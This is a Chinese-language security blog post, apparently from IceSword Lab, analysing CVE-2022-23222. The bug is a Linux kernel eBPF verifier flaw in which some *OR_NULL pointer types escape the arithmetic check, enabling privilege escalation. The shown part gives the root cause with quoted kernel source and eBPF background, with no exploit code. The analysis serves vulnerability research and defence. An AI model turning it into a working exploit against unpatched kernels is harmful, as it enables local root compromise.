<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>CVE-2022-23222  eBPF verifier 提权漏洞利用分析 | IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="CVE-2022-23222 漏洞分析author: moxingyuan from iceswordlab 一、漏洞背景CVE-2022-23222 是一个 Linux 内核漏洞，其成因为 eBPF verifier 未阻止某些 *OR_NULL 类型指针的算数加减运算。利用该漏洞可导致权限提升。 受该漏洞影响的内核版本范围为 5.8 - 5.16 。 该漏洞分别在内核版本 5.10.92、5.">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-23222  eBPF verifier 提权漏洞利用分析">
<meta property="og:url" content="http://yoursite.com/2022/07/04/CVE-2022-23222/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="CVE-2022-23222 漏洞分析author: moxingyuan from iceswordlab 一、漏洞背景CVE-2022-23222 是一个 Linux 内核漏洞，其成因为 eBPF verifier 未阻止某些 *OR_NULL 类型指针的算数加减运算。利用该漏洞可导致权限提升。 受该漏洞影响的内核版本范围为 5.8 - 5.16 。 该漏洞分别在内核版本 5.10.92、5.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2022/07/04/CVE-2022-23222/images/01.jpg">
<meta property="og:image" content="http://yoursite.com/2022/07/04/CVE-2022-23222/images/02.jpg">
<meta property="og:image" content="http://yoursite.com/2022/07/04/CVE-2022-23222/images/03.jpg">
<meta property="article:published_time" content="2022-07-04T14:00:00.000Z">
<meta property="article:modified_time" content="2025-07-16T10:02:19.308Z">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2022/07/04/CVE-2022-23222/images/01.jpg">
  
    <link rel="alternate" href="../../../../atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="../../../../css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../../../index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="../../../../index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../../../archives">Archives</a>
        
          <a class="main-nav-link" href="../../../../research">Research</a>
        
          <a class="main-nav-link" href="../../../../vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="../../../../recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="../../../../about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2022/07/04/CVE-2022-23222" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2022-07-04T14:00:00.000Z" itemprop="datePublished">2022-07-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2022-23222  eBPF verifier 提权漏洞利用分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2022-23222-漏洞分析"><a href="#CVE-2022-23222-漏洞分析" class="headerlink" title="CVE-2022-23222 漏洞分析"></a>CVE-2022-23222 漏洞分析</h1><p>author: moxingyuan from iceswordlab</p>
<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>CVE-2022-23222 是一个 Linux 内核漏洞，其成因为 eBPF verifier 未阻止某些 *OR_NULL 类型指针的算数加减运算。利用该漏洞可导致权限提升。</p>
<p>受该漏洞影响的内核版本范围为 5.8 - 5.16 。</p>
<p>该漏洞分别在内核版本 5.10.92、5.15.15、5.16.1 中被修复，其中，5.10.92 版本修复该漏洞的 commit 为 [35ab8c9085b0af847df7fac9571ccd26d9f0f513](<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=35ab8c9085b0af847df7fac9571ccd26d9f0f513" target="_blank" rel="noopener">kernel/git/stable/linux.git - Linux kernel stable tree</a>) 。</p>
<h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><p>漏洞形成于 kernel/bpf/verifier.c 的 adjust_ptr_min_max_vals 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_ptr_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">				   struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *ptr_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *off_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (ptr_reg-&gt;type) &#123;</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_MAP_VALUE_OR_NULL:</span><br><span class="line">		verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited, null-check it first\n"</span>,</span><br><span class="line">			dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	<span class="keyword">case</span> CONST_PTR_TO_MAP:</span><br><span class="line">		<span class="comment">/* smin_val represents the known value */</span></span><br><span class="line">		<span class="keyword">if</span> (known &amp;&amp; smin_val == <span class="number">0</span> &amp;&amp; opcode == BPF_ADD)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		fallthrough;</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_PACKET_END:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCKET:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCKET_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCK_COMMON:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCK_COMMON_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_TCP_SOCK:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_TCP_SOCK_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_XDP_SOCK:</span><br><span class="line">		verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited\n"</span>,</span><br><span class="line">			dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在禁止特定指针类型的算数加减运算时，没有列举完所有的 *OR_NULL 类型指针，导致部分 *OR_NULL 类型指针可以进行非法运算。</p>
<p>所有的 *OR_NULL 类型指针可以在枚举类型 bpf_reg_type 中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_reg_type &#123;</span><br><span class="line">    NOT_INIT = <span class="number">0</span>,         <span class="comment">/* nothing was written into register */</span></span><br><span class="line">    SCALAR_VALUE,         <span class="comment">/* reg doesn't contain a valid pointer */</span></span><br><span class="line">    PTR_TO_CTX,           <span class="comment">/* reg points to bpf_context */</span></span><br><span class="line">    CONST_PTR_TO_MAP,     <span class="comment">/* reg points to struct bpf_map */</span></span><br><span class="line">    PTR_TO_MAP_VALUE,     <span class="comment">/* reg points to map element value */</span></span><br><span class="line">    PTR_TO_MAP_VALUE_OR_NULL,  <span class="comment">/* points to map elem value or NULL */</span></span><br><span class="line">    PTR_TO_STACK,         <span class="comment">/* reg == frame_pointer + offset */</span></span><br><span class="line">    PTR_TO_PACKET_META,   <span class="comment">/* skb-&gt;data - meta_len */</span></span><br><span class="line">    PTR_TO_PACKET,        <span class="comment">/* reg points to skb-&gt;data */</span></span><br><span class="line">    PTR_TO_PACKET_END,    <span class="comment">/* skb-&gt;data + headlen */</span></span><br><span class="line">    PTR_TO_FLOW_KEYS,     <span class="comment">/* reg points to bpf_flow_keys */</span></span><br><span class="line">    PTR_TO_SOCKET,        <span class="comment">/* reg points to struct bpf_sock */</span></span><br><span class="line">    PTR_TO_SOCKET_OR_NULL,      <span class="comment">/* reg points to struct bpf_sock or NULL */</span></span><br><span class="line">    PTR_TO_SOCK_COMMON,   <span class="comment">/* reg points to sock_common */</span></span><br><span class="line">    PTR_TO_SOCK_COMMON_OR_NULL, <span class="comment">/* reg points to sock_common or NULL */</span></span><br><span class="line">    PTR_TO_TCP_SOCK,      <span class="comment">/* reg points to struct tcp_sock */</span></span><br><span class="line">    PTR_TO_TCP_SOCK_OR_NULL,    <span class="comment">/* reg points to struct tcp_sock or NULL */</span></span><br><span class="line">    PTR_TO_TP_BUFFER,     <span class="comment">/* reg points to a writable raw tp's buffer */</span></span><br><span class="line">    PTR_TO_XDP_SOCK,      <span class="comment">/* reg points to struct xdp_sock */</span></span><br><span class="line">    <span class="comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span></span><br><span class="line"><span class="comment">     * to be null checked by the BPF program. This does not imply the</span></span><br><span class="line"><span class="comment">     * pointer is _not_ null and in practice this can easily be a null</span></span><br><span class="line"><span class="comment">     * pointer when reading pointer chains. The assumption is program</span></span><br><span class="line"><span class="comment">     * context will handle null pointer dereference typically via fault</span></span><br><span class="line"><span class="comment">     * handling. The verifier must keep this in mind and can make no</span></span><br><span class="line"><span class="comment">     * assumptions about null or non-null when doing branch analysis.</span></span><br><span class="line"><span class="comment">     * Further, when passed into helpers the helpers can not, without</span></span><br><span class="line"><span class="comment">     * additional context, assume the value is non-null.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PTR_TO_BTF_ID,</span><br><span class="line">    <span class="comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span></span><br><span class="line"><span class="comment">     * been checked for null. Used primarily to inform the verifier</span></span><br><span class="line"><span class="comment">     * an explicit null check is required for this struct.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PTR_TO_BTF_ID_OR_NULL,</span><br><span class="line">    PTR_TO_MEM,           <span class="comment">/* reg points to valid memory region */</span></span><br><span class="line">    PTR_TO_MEM_OR_NULL,   <span class="comment">/* reg points to valid memory region or NULL */</span></span><br><span class="line">    PTR_TO_RDONLY_BUF,    <span class="comment">/* reg points to a readonly buffer */</span></span><br><span class="line">    PTR_TO_RDONLY_BUF_OR_NULL,  <span class="comment">/* reg points to a readonly buffer or NULL */</span></span><br><span class="line">    PTR_TO_RDWR_BUF,      <span class="comment">/* reg points to a read/write buffer */</span></span><br><span class="line">    PTR_TO_RDWR_BUF_OR_NULL,    <span class="comment">/* reg points to a read/write buffer or NULL */</span></span><br><span class="line">    PTR_TO_PERCPU_BTF_ID,       <span class="comment">/* reg points to a percpu kernel variable */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可发现漏掉的指针类型包括：</p>
<ul>
<li>PTR_TO_BTF_ID_OR_NULL</li>
<li>PTR_TO_MEM_OR_NULL</li>
<li>PTR_TO_RDONLY_BUF_OR_NULL</li>
<li>PTR_TO_RDWR_BUF_OR_NULL</li>
</ul>
<h2 id="三、漏洞相关知识"><a href="#三、漏洞相关知识" class="headerlink" title="三、漏洞相关知识"></a>三、漏洞相关知识</h2><p>eBPF (Extended Berkeley Packet Filter) 由 cBPF (Classic Berkeley Packet Filter) 衍生而来，是一项可在内核虚拟机中运行程序的技术。使用eBPF无需修改内核源码，或者插入驱动，对系统的入侵性相对没那么强，可以安全并有效地扩展内核的功能。</p>
<h3 id="3-1-eBPF指令"><a href="#3-1-eBPF指令" class="headerlink" title="3.1 eBPF指令"></a>3.1 eBPF指令</h3><p>eBPF 使用类似 x86 的虚拟机指令，基础指令为 8 字节，其编码格式为：</p>
<table>
<thead>
<tr>
<th align="center">32 bits (MSB)</th>
<th align="center">16 bits</th>
<th align="center">4 bits</th>
<th align="center">4 bits</th>
<th align="center">8 bits (LSB)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">immediate</td>
<td align="center">offset</td>
<td align="center">source register</td>
<td align="center">destination register</td>
<td align="center">opcode</td>
</tr>
</tbody></table>
<p>扩展指令在基础指令基础上增加 8 个字节的立即数，总长度为 16 字节。</p>
<p>伪指令是内核代码中定义的方便理解记忆的助记符，通常是对真实指令的包装。</p>
<p>下文中出现的指令/伪指令及其功能如下：</p>
<table>
<thead>
<tr>
<th align="center">指令/伪指令</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BPF_MOV64_REG(DST, SRC)</td>
<td align="center">dst = src</td>
</tr>
<tr>
<td align="center">BPF_MOV64_IMM(DST, IMM)</td>
<td align="center">dst_reg = imm32</td>
</tr>
<tr>
<td align="center">BPF_ST_MEM(SIZE, DST, OFF, IMM)</td>
<td align="center">*(uint *) (dst_reg + off16) = imm32</td>
</tr>
<tr>
<td align="center">BPF_STX_MEM(SIZE, DST, SRC, OFF)</td>
<td align="center">*(uint *) (dst_reg + off16) = src_reg</td>
</tr>
<tr>
<td align="center">BPF_LDX_MEM(SIZE, DST, SRC, OFF)</td>
<td align="center">dst_reg = *(uint *) (src_reg + off16)</td>
</tr>
<tr>
<td align="center">BPF_ALU64_IMM(OP, DST, IMM)</td>
<td align="center">dst_reg = dst_reg ‘op’ imm32</td>
</tr>
<tr>
<td align="center">BPF_JMP_IMM(OP, DST, IMM, OFF)</td>
<td align="center">if (dst_reg ‘op’ imm32) goto pc + off16</td>
</tr>
<tr>
<td align="center">BPF_LD_MAP_FD(DST, MAP_FD)</td>
<td align="center">dst = map_fd</td>
</tr>
<tr>
<td align="center">BPF_EXIT_INSN()</td>
<td align="center">exit</td>
</tr>
</tbody></table>
<h3 id="3-2-eBPF寄存器"><a href="#3-2-eBPF寄存器" class="headerlink" title="3.2 eBPF寄存器"></a>3.2 eBPF寄存器</h3><p>eBPF 共有 11 个寄存器，其中 R10 是只读的帧指针，剩余 10 个是通用寄存器。</p>
<ul>
<li>R0: 保存函数返回值，及 eBPF 程序退出值</li>
<li>R1 - R5: 传递函数参数，调用函数保存</li>
<li>R6 - R9: 被调用函数保存</li>
<li>R10: 只读的帧指针</li>
</ul>
<h3 id="3-3-eBPF程序类型"><a href="#3-3-eBPF程序类型" class="headerlink" title="3.3 eBPF程序类型"></a>3.3 eBPF程序类型</h3><p>所有 eBPF 程序类型定义在以下枚举类型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_prog_type &#123;</span><br><span class="line">	BPF_PROG_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCKET_FILTER = <span class="number">1</span>,</span><br><span class="line">	BPF_PROG_TYPE_KPROBE = <span class="number">2</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_CLS = <span class="number">3</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_ACT = <span class="number">4</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACEPOINT = <span class="number">5</span>,</span><br><span class="line">	BPF_PROG_TYPE_XDP = <span class="number">6</span>,</span><br><span class="line">	BPF_PROG_TYPE_PERF_EVENT = <span class="number">7</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SKB = <span class="number">8</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK = <span class="number">9</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_IN = <span class="number">10</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_OUT = <span class="number">11</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_XMIT = <span class="number">12</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCK_OPS = <span class="number">13</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_SKB = <span class="number">14</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_DEVICE = <span class="number">15</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_MSG = <span class="number">16</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT = <span class="number">17</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK_ADDR = <span class="number">18</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_SEG6LOCAL = <span class="number">19</span>,</span><br><span class="line">	BPF_PROG_TYPE_LIRC_MODE2 = <span class="number">20</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_REUSEPORT = <span class="number">21</span>,</span><br><span class="line">	BPF_PROG_TYPE_FLOW_DISSECTOR = <span class="number">22</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SYSCTL = <span class="number">23</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE = <span class="number">24</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCKOPT = <span class="number">25</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACING = <span class="number">26</span>,</span><br><span class="line">	BPF_PROG_TYPE_STRUCT_OPS = <span class="number">27</span>,</span><br><span class="line">	BPF_PROG_TYPE_EXT = <span class="number">28</span>,</span><br><span class="line">	BPF_PROG_TYPE_LSM = <span class="number">29</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_LOOKUP = <span class="number">30</span>,</span><br><span class="line">	BPF_PROG_TYPE_SYSCALL = <span class="number">31</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下文涉及到的类型只有 BPF_PROG_TYPE_SOCKET_FILTER 。该类型 eBPF 程序通过 setsockopt 附加到指定 socket 上面，对 socket 的流量进行追踪、过滤，可附加的 socket 类型包括 UNIX socket 。</p>
<p>该类型程序的传入参数为结构体 __sk_buff 指针，可通过调用 bpf_skb_load_bytes_relative 辅助函数经由该结构体获取 socket 流量。</p>
<h3 id="3-4-eBPF-map"><a href="#3-4-eBPF-map" class="headerlink" title="3.4 eBPF map"></a>3.4 eBPF map</h3><p>eBPF map 是 eBPF 程序和用户态进行数据交换的媒介。其类型包括：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_map_type &#123;</span><br><span class="line">	BPF_MAP_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH = <span class="number">1</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY = <span class="number">2</span>,</span><br><span class="line">	BPF_MAP_TYPE_PROG_ARRAY = <span class="number">3</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERF_EVENT_ARRAY = <span class="number">4</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_HASH = <span class="number">5</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_ARRAY = <span class="number">6</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK_TRACE = <span class="number">7</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_ARRAY = <span class="number">8</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_HASH = <span class="number">9</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_PERCPU_HASH = <span class="number">10</span>,</span><br><span class="line">	BPF_MAP_TYPE_LPM_TRIE = <span class="number">11</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY_OF_MAPS = <span class="number">12</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH_OF_MAPS = <span class="number">13</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP = <span class="number">14</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKMAP = <span class="number">15</span>,</span><br><span class="line">	BPF_MAP_TYPE_CPUMAP = <span class="number">16</span>,</span><br><span class="line">	BPF_MAP_TYPE_XSKMAP = <span class="number">17</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKHASH = <span class="number">18</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE = <span class="number">19</span>,</span><br><span class="line">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY = <span class="number">20</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE = <span class="number">21</span>,</span><br><span class="line">	BPF_MAP_TYPE_QUEUE = <span class="number">22</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK = <span class="number">23</span>,</span><br><span class="line">	BPF_MAP_TYPE_SK_STORAGE = <span class="number">24</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP_HASH = <span class="number">25</span>,</span><br><span class="line">	BPF_MAP_TYPE_STRUCT_OPS = <span class="number">26</span>,</span><br><span class="line">	BPF_MAP_TYPE_RINGBUF = <span class="number">27</span>,</span><br><span class="line">	BPF_MAP_TYPE_INODE_STORAGE = <span class="number">28</span>,</span><br><span class="line">	BPF_MAP_TYPE_TASK_STORAGE = <span class="number">29</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下文使用到的类型包括 BPF_MAP_TYPE_ARRAY 和 BPF_MAP_TYPE_RINGBUF 。</p>
<p>顾名思义，BPF_MAP_TYPE_ARRAY 类似数组，索引为整形，值可为任意长度的内存对象。</p>
<p>BPF_MAP_TYPE_RINGBUF 是环形缓冲区，如果写入的数据来不及读取，导致积累的数据超过缓冲区长度，新数据则会覆盖掉旧数据。</p>
<h3 id="3-5-eBPF辅助函数"><a href="#3-5-eBPF辅助函数" class="headerlink" title="3.5 eBPF辅助函数"></a>3.5 eBPF辅助函数</h3><p>eBPF 辅助函数（eBPF helper）是可在 eBPF 程序中使用的辅助函数。</p>
<p>内核规定了不同类型的eBPF程序可使用哪些辅助函数，比如，bpf_skb_load_bytes_relative 只有 socket 相关的 eBPF 程序可使用。</p>
<p>各 eBPF 辅助函数的函数原型由内核定义，下文使用到的一些辅助函数的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_lookup_elem_proto</span> = &#123;</span></span><br><span class="line">	.func		= bpf_map_lookup_elem,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.pkt_access	= <span class="literal">true</span>,</span><br><span class="line">	.ret_type	= RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_PTR_TO_MAP_KEY,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_ringbuf_reserve_proto</span> = &#123;</span></span><br><span class="line">	.func		= bpf_ringbuf_reserve,</span><br><span class="line">	.ret_type	= RET_PTR_TO_ALLOC_MEM_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_CONST_ALLOC_SIZE_OR_ZERO,</span><br><span class="line">	.arg3_type	= ARG_ANYTHING,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可见 bpf_map_lookup_elem 的返回值类型是 RET_PTR_TO_MAP_VALUE_OR_NULL ，bpf_ringbuf_reserve 的返回值类型是RET_PTR_TO_ALLOC_MEM_OR_NULL 。</p>
<p>各 eBPF 辅助函数的功能可通过 man bpf-helpers 命令查看。</p>
<h3 id="3-6-eBPF-verifier"><a href="#3-6-eBPF-verifier" class="headerlink" title="3.6 eBPF verifier"></a>3.6 eBPF verifier</h3><p>eBPF 程序在加载进内核之前，必须通过 eBPF verifier 的检查。只有符合要求的 eBPF 程序才允许被加载进内核，这是为了防止 eBPF 程序对内核进行破坏。</p>
<p>eBPF verifier 对 eBPF 程序的限制包括：</p>
<ul>
<li>不能调用任意的内核函数，只限于内核模块中列出的 eBPF helper 函数</li>
<li>不允许包含无法到达的指令，防止加载无效代码，延迟程序的终止。</li>
<li>限制循环次数，必须在有限次内结束。</li>
<li>栈大小被限制为 MAX_BPF_STACK，截止到内核 5.10.83 版本，被设置为 512。</li>
<li>限制 eBPF 程序的复杂度，verifier 处理的指令数不得超过 BPF_COMPLEXITY_LIMIT_INSNS，截止到内核 5.10.83 版本，被设置为100万。</li>
<li>限制 eBPF 程序对内存的访问，比如不得访问未初始化的栈，不得越界访问 eBPF map 。</li>
</ul>
